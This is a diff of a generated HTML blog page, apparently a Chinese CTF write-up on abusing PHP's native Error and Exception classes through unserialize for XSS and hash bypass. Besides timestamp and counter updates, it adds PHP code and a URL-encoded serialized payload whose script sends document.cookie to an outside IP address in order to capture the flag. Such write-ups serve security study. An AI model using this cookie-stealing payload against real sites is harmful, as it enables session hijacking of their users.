@@ -28,7 +28,7 @@
 <meta property="og:image" content="https://baozongwi.xyz/images/QQ20240919-152139.png">
 <meta property="og:image" content="https://baozongwi.xyz/images/QQ20240920-185523.png">
 <meta property="article:published_time" content="2024-09-19T02:09:04.000Z">
-<meta property="article:modified_time" content="2024-09-21T04:40:54.486Z">
+<meta property="article:modified_time" content="2024-09-25T12:38:43.133Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="姿势">
 <meta property="article:tag" content="php">
@@ -397,7 +397,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">22</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -405,7 +405,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">70</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">71</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -459,8 +459,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-21 12:40:54</span>
-            <span class="mobile">2024-09-21 12:40:54</span>
+            <span class="desktop">2024-09-25 20:38:43</span>
+            <span class="mobile">2024-09-25 20:38:43</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -727,7 +727,7 @@
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>
 
 <p>或者是另一个</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>
 
 <p>只要是<code>xss</code>能做的都能做，看看是这两个类中的什么方法导致的呢,众所周知<code>echo</code>是来触发<code>__toString()</code>的但是我们进入方法看看</p>
 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">zend_string *message = zval_get_string(GET_PROPERTY(exception, ZEND_STR_MESSAGE));</span><br><span class="line"><span class="comment">//这里捕捉message属性</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((Z_OBJCE_P(exception) == zend_ce_type_error || Z_OBJCE_P(exception) == zend_ce_argument_count_error) &amp;&amp; <span class="built_in">strstr</span>(ZSTR_VAL(message), <span class="string">&quot;, called in &quot;</span>)) &#123;</span><br><span class="line">			zend_string *real_message = zend_strpprintf_unchecked(<span class="number">0</span>, <span class="string">&quot;%S and defined&quot;</span>, message);</span><br><span class="line">			zend_string_release_ex(message, <span class="number">0</span>);</span><br><span class="line">			message = real_message;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">// 这里进行错误捕捉</span></span><br><span class="line">RETURN_STR(str);</span><br><span class="line">这里再放回</span><br></pre></td></tr></table></figure></div>
@@ -741,7 +741,9 @@
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure></div>
 
 <p>那么回去找网站，找不到什么东西，先尝试打<code>cookie</code></p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds[is_so_beautiful=O%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">Exception</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A73%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.open%<span class="number">28</span>%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F27.<span class="number">25.151</span>.<span class="number">48</span>%<span class="number">3</span>A9999%<span class="number">2</span>F%<span class="number">22</span>%<span class="number">2</span>Bdocument.cookie%<span class="number">29</span>%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A34%<span class="number">3</span>A%<span class="number">22</span>D%<span class="number">3</span>A%<span class="number">5</span>CPHPstudy%<span class="number">5</span>Cphpstudy_pro%<span class="number">5</span>CWWW%<span class="number">5</span>C2.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.open(&#x27;http://27.25.151.48:9999/&#x27;+document.cookie)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds[is_so_beautiful=O%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">Exception</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A73%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.open%<span class="number">28</span>%<span class="number">27</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F27.<span class="number">25.151</span>.<span class="number">48</span>%<span class="number">3</span>A9999%<span class="number">2</span>F%<span class="number">27</span>%<span class="number">2</span>Bdocument.cookie%<span class="number">29</span>%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A54%<span class="number">3</span>A%<span class="number">22</span>C%<span class="number">3</span>A%<span class="number">5</span>CUsers%<span class="number">5</span>Cbaozhongqi%<span class="number">5</span>CDocuments%<span class="number">5</span>CVSCODE%<span class="number">5</span>C.vscode%<span class="number">5</span>Cphp%<span class="number">5</span>C1.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></div>
 
 <p>成功拿到<code>flag</code>,我想着要是还拿不到的话就直接打源码了，但是所幸拿到了</p>
 <h3 id="绕过hash"><a href="#绕过hash" class="headerlink" title="绕过hash"></a>绕过hash</h3><h4 id="Error-Exception-1"><a href="#Error-Exception-1" class="headerlink" title="Error&#x2F;Exception"></a>Error&#x2F;Exception</h4><p><strong>Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7。</strong></p>
@@ -846,7 +848,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-21 12:40:54
+                    :</strong> 2024-09-25 20:38:43
             </li>
         
         <li>
@@ -943,7 +945,7 @@
           serverURL: 'https://vercel-waline-eight.vercel.app/',
           lang: 'zh-CN',
           dark: 'body[class~="dark-mode"]',
-          reaction: false,
+          reaction: true,
           requiredMeta: ['nick', 'mail'],
           emoji: [],
           recaptchaV3Key: "wasd",
@@ -1007,11 +1009,11 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        70 posts in total
+                        71 posts in total
                     </span>
                     
                         <span>
-                            146.5k words in total
+                            149.1k words in total
                         </span>
                     
                 </p>
